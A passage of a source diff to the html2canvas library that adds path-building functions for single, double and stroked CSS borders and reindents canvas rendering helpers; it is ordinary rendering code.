-	if (isBezierCurve(inner2)) {
-		path.push(inner2.subdivide(0.5, true).reverse());
-	}
-	else {
-		path.push(inner2);
-	}
-	if (isBezierCurve(inner1)) {
-		path.push(inner1.subdivide(0.5, false).reverse());
-	}
-	else {
-		path.push(inner1);
-	}
-	return path;
-};
+  var parsePathForBorder = function (curves, borderSide) {
+  	switch (borderSide) {
+  	case 0:
+  		return createPathFromCurves(curves.topLeftBorderBox, curves.topLeftPaddingBox, curves.topRightBorderBox, curves.topRightPaddingBox);
+  	case 1:
+  		return createPathFromCurves(curves.topRightBorderBox, curves.topRightPaddingBox, curves.bottomRightBorderBox, curves.bottomRightPaddingBox);
+  	case 2:
+  		return createPathFromCurves(curves.bottomRightBorderBox, curves.bottomRightPaddingBox, curves.bottomLeftBorderBox, curves.bottomLeftPaddingBox);
+  	case 3:
+  	default:
+  		return createPathFromCurves(curves.bottomLeftBorderBox, curves.bottomLeftPaddingBox, curves.topLeftBorderBox, curves.topLeftPaddingBox);
+  	}
+  };
+  var parsePathForBorderDoubleOuter = function (curves, borderSide) {
+  	switch (borderSide) {
+  	case 0:
+  		return createPathFromCurves(curves.topLeftBorderBox, curves.topLeftBorderDoubleOuterBox, curves.topRightBorderBox, curves.topRightBorderDoubleOuterBox);
+  	case 1:
+  		return createPathFromCurves(curves.topRightBorderBox, curves.topRightBorderDoubleOuterBox, curves.bottomRightBorderBox, curves.bottomRightBorderDoubleOuterBox);
+  	case 2:
+  		return createPathFromCurves(curves.bottomRightBorderBox, curves.bottomRightBorderDoubleOuterBox, curves.bottomLeftBorderBox, curves.bottomLeftBorderDoubleOuterBox);
+  	case 3:
+  	default:
+  		return createPathFromCurves(curves.bottomLeftBorderBox, curves.bottomLeftBorderDoubleOuterBox, curves.topLeftBorderBox, curves.topLeftBorderDoubleOuterBox);
+  	}
+  };
+  var parsePathForBorderDoubleInner = function (curves, borderSide) {
+  	switch (borderSide) {
+  	case 0:
+  		return createPathFromCurves(curves.topLeftBorderDoubleInnerBox, curves.topLeftPaddingBox, curves.topRightBorderDoubleInnerBox, curves.topRightPaddingBox);
+  	case 1:
+  		return createPathFromCurves(curves.topRightBorderDoubleInnerBox, curves.topRightPaddingBox, curves.bottomRightBorderDoubleInnerBox, curves.bottomRightPaddingBox);
+  	case 2:
+  		return createPathFromCurves(curves.bottomRightBorderDoubleInnerBox, curves.bottomRightPaddingBox, curves.bottomLeftBorderDoubleInnerBox, curves.bottomLeftPaddingBox);
+  	case 3:
+  	default:
+  		return createPathFromCurves(curves.bottomLeftBorderDoubleInnerBox, curves.bottomLeftPaddingBox, curves.topLeftBorderDoubleInnerBox, curves.topLeftPaddingBox);
+  	}
+  };
+  var parsePathForBorderStroke = function (curves, borderSide) {
+  	switch (borderSide) {
+  	case 0:
+  		return createStrokePathFromCurves(curves.topLeftBorderStroke, curves.topRightBorderStroke);
+  	case 1:
+  		return createStrokePathFromCurves(curves.topRightBorderStroke, curves.bottomRightBorderStroke);
+  	case 2:
+  		return createStrokePathFromCurves(curves.bottomRightBorderStroke, curves.bottomLeftBorderStroke);
+  	case 3:
+  	default:
+  		return createStrokePathFromCurves(curves.bottomLeftBorderStroke, curves.topLeftBorderStroke);
+  	}
+  };
+  var createStrokePathFromCurves = function (outer1, outer2) {
+  	var path = [];
+  	if (isBezierCurve(outer1)) {
+  		path.push(outer1.subdivide(0.5, false));
+  	}
+  	else {
+  		path.push(outer1);
+  	}
+  	if (isBezierCurve(outer2)) {
+  		path.push(outer2.subdivide(0.5, true));
+  	}
+  	else {
+  		path.push(outer2);
+  	}
+  	return path;
+  };
+  var createPathFromCurves = function (outer1, inner1, outer2, inner2) {
+  	var path = [];
+  	if (isBezierCurve(outer1)) {
+  		path.push(outer1.subdivide(0.5, false));
+  	}
+  	else {
+  		path.push(outer1);
+  	}
+  	if (isBezierCurve(outer2)) {
+  		path.push(outer2.subdivide(0.5, true));
+  	}
+  	else {
+  		path.push(outer2);
+  	}
+  	if (isBezierCurve(inner2)) {
+  		path.push(inner2.subdivide(0.5, true).reverse());
+  	}
+  	else {
+  		path.push(inner2);
+  	}
+  	if (isBezierCurve(inner1)) {
+  		path.push(inner1.subdivide(0.5, false).reverse());
+  	}
+  	else {
+  		path.push(inner1);
+  	}
+  	return path;
+  };
 
-var paddingBox = function (element) {
-	var bounds = element.bounds;
-	var styles = element.styles;
-	return bounds.add(styles.borderLeftWidth, styles.borderTopWidth, -(styles.borderRightWidth + styles.borderLeftWidth), -(styles.borderTopWidth + styles.borderBottomWidth));
-};
-var contentBox = function (element) {
-	var styles = element.styles;
-	var bounds = element.bounds;
-	var paddingLeft = getAbsoluteValue(styles.paddingLeft, bounds.width);
-	var paddingRight = getAbsoluteValue(styles.paddingRight, bounds.width);
-	var paddingTop = getAbsoluteValue(styles.paddingTop, bounds.width);
-	var paddingBottom = getAbsoluteValue(styles.paddingBottom, bounds.width);
-	return bounds.add(paddingLeft + styles.borderLeftWidth, paddingTop + styles.borderTopWidth, -(styles.borderRightWidth + styles.borderLeftWidth + paddingLeft + paddingRight), -(styles.borderTopWidth + styles.borderBottomWidth + paddingTop + paddingBottom));
-};
+  var paddingBox = function (element) {
+  	var bounds = element.bounds;
+  	var styles = element.styles;
+  	return bounds.add(styles.borderLeftWidth, styles.borderTopWidth, -(styles.borderRightWidth + styles.borderLeftWidth), -(styles.borderTopWidth + styles.borderBottomWidth));
+  };
+  var contentBox = function (element) {
+  	var styles = element.styles;
+  	var bounds = element.bounds;
+  	var paddingLeft = getAbsoluteValue(styles.paddingLeft, bounds.width);
+  	var paddingRight = getAbsoluteValue(styles.paddingRight, bounds.width);
+  	var paddingTop = getAbsoluteValue(styles.paddingTop, bounds.width);
+  	var paddingBottom = getAbsoluteValue(styles.paddingBottom, bounds.width);
+  	return bounds.add(paddingLeft + styles.borderLeftWidth, paddingTop + styles.borderTopWidth, -(styles.borderRightWidth + styles.borderLeftWidth + paddingLeft + paddingRight), -(styles.borderTopWidth + styles.borderBottomWidth + paddingTop + paddingBottom));
+  };
 
-var calculateBackgroundPositioningArea = function (backgroundOrigin, element) {
+  var calculateBackgroundPositioningArea = function (backgroundOrigin, element) {
         if (backgroundOrigin === 0 /* BORDER_BOX */) {
-	return element.bounds;
-}
+  	return element.bounds;
+  }
         if (backgroundOrigin === 2 /* CONTENT_BOX */) {
-return contentBox(element);
+  return contentBox(element);
 }
 return paddingBox(element);
 };
@@ -7972,28 +8454,28 @@ var calculateBackgroundRepeatPath = function (repeat, _a, _b, backgroundPosition
 			new Vector(Math.round(backgroundPositioningArea.left + backgroundPositioningArea.width), Math.round(backgroundPositioningArea.top + y)),
 			new Vector(Math.round(backgroundPositioningArea.left + backgroundPositioningArea.width), Math.round(height + backgroundPositioningArea.top + y)),
 			new Vector(Math.round(backgroundPositioningArea.left), Math.round(height + backgroundPositioningArea.top + y))
-			];
+		];
             case 3 /* REPEAT_Y */:
 		return [
 			new Vector(Math.round(backgroundPositioningArea.left + x), Math.round(backgroundPositioningArea.top)),
 			new Vector(Math.round(backgroundPositioningArea.left + x + width), Math.round(backgroundPositioningArea.top)),
 			new Vector(Math.round(backgroundPositioningArea.left + x + width), Math.round(backgroundPositioningArea.height + backgroundPositioningArea.top)),
 			new Vector(Math.round(backgroundPositioningArea.left + x), Math.round(backgroundPositioningArea.height + backgroundPositioningArea.top))
-			];
+		];
             case 1 /* NO_REPEAT */:
 		return [
 			new Vector(Math.round(backgroundPositioningArea.left + x), Math.round(backgroundPositioningArea.top + y)),
 			new Vector(Math.round(backgroundPositioningArea.left + x + width), Math.round(backgroundPositioningArea.top + y)),
 			new Vector(Math.round(backgroundPositioningArea.left + x + width), Math.round(backgroundPositioningArea.top + y + height)),
 			new Vector(Math.round(backgroundPositioningArea.left + x), Math.round(backgroundPositioningArea.top + y + height))
-			];
+		];
 	default:
 		return [
 			new Vector(Math.round(backgroundPaintingArea.left), Math.round(backgroundPaintingArea.top)),
 			new Vector(Math.round(backgroundPaintingArea.left + backgroundPaintingArea.width), Math.round(backgroundPaintingArea.top)),
 			new Vector(Math.round(backgroundPaintingArea.left + backgroundPaintingArea.width), Math.round(backgroundPaintingArea.height + backgroundPaintingArea.top)),
 			new Vector(Math.round(backgroundPaintingArea.left), Math.round(backgroundPaintingArea.height + backgroundPaintingArea.top))
-			];
+		];
 	}
 };
 
@@ -8055,7 +8537,7 @@ return FontMetrics;
     	this.options = options;
     }
     return Renderer;
-}());
+  }());
 
     var MASK_OFFSET = 10000;
     var CanvasRenderer = /** @class */ (function (_super) {
@@ -8169,7 +8651,7 @@ return FontMetrics;
     		[styles.fontStyle, fontVariant, styles.fontWeight, fontSize, fontFamily].join(' '),
     		fontFamily,
     		fontSize
-    		];
+    	];
     };
     CanvasRenderer.prototype.renderTextNode = function (text, styles) {
     	return __awaiter(this, void 0, void 0, function () {
@@ -8341,7 +8823,7 @@ return FontMetrics;
     								new Vector(container.bounds.left + size * 0.72983, container.bounds.top + size * 0.23),
     								new Vector(container.bounds.left + size * 0.84, container.bounds.top + size * 0.34085),
     								new Vector(container.bounds.left + size * 0.39363, container.bounds.top + size * 0.79)
-    								]);
+    							]);
     							this.ctx.fillStyle = asString(INPUT_COLOR);
     							this.ctx.fill();
     							this.ctx.restore();
@@ -8382,7 +8864,7 @@ return FontMetrics;
     						new Vector(bounds.left + bounds.width, bounds.top),
     						new Vector(bounds.left + bounds.width, bounds.top + bounds.height),
     						new Vector(bounds.left, bounds.top + bounds.height)
-    						]);
+    					]);
     					this.ctx.clip();
     					this.renderTextWithLetterSpacing(new TextBounds(container.value, textBounds), styles.letterSpacing, baseline);
     					this.ctx.restore();
@@ -8624,7 +9106,7 @@ CanvasRenderer.prototype.renderBackgroundImage = function (container) {
 									image.width,
 									image.height,
 									image.width / image.height
-									]), path = _c[0], x = _c[1], y = _c[2], width = _c[3], height = _c[4];
+								]), path = _c[0], x = _c[1], y = _c[2], width = _c[3], height = _c[4];
 								pattern = this_1.ctx.createPattern(this_1.resizeImage(image, width, height), 'repeat');
 								this_1.renderRepeat(path, pattern, x, y);
 							}
@@ -8653,7 +9135,7 @@ CanvasRenderer.prototype.renderBackgroundImage = function (container) {
 									null,
 									null,
 									null
-									]), path = _f[0], left = _f[1], top_1 = _f[2], width = _f[3], height = _f[4];
+								]), path = _f[0], left = _f[1], top_1 = _f[2], width = _f[3], height = _f[4];
 								position = backgroundImage.position.length === 0 ? [FIFTY_PERCENT] : backgroundImage.position;
 								x = getAbsoluteValue(position[0], width);
 								y = getAbsoluteValue(position[position.length - 1], height);
@@ -8756,7 +9238,7 @@ CanvasRenderer.prototype.renderNodeBackgroundAndBorders = function (paint) {
 					{ style: styles.borderRightStyle, color: styles.borderRightColor, width: styles.borderRightWidth },
 					{ style: styles.borderBottomStyle, color: styles.borderBottomColor, width: styles.borderBottomWidth },
 					{ style: styles.borderLeftStyle, color: styles.borderLeftColor, width: styles.borderLeftWidth }
-					];
+				];
 				backgroundPaintingArea = calculateBackgroundCurvedPaintingArea(getBackgroundValueForIndex(styles.backgroundClip, 0), paint.curves);
                             if (!(hasBackground || styles.boxShadow.length)) return [3 /*break*/, 2];
 				this.ctx.save();
@@ -9131,7 +9613,7 @@ return ForeignObjectRenderer;
     };
     Logger.instances = {};
     return Logger;
-}());
+  }());
 
     var Context = /** @class */ (function () {
     function Context(options, windowBounds) {
@@ -9143,7 +9625,7 @@ return ForeignObjectRenderer;
     }
     Context.instanceCount = 1;
     return Context;
-}());
+  }());
 
     var html2canvas = function (element, options) {
     	if (options === void 0) { options = {}; }
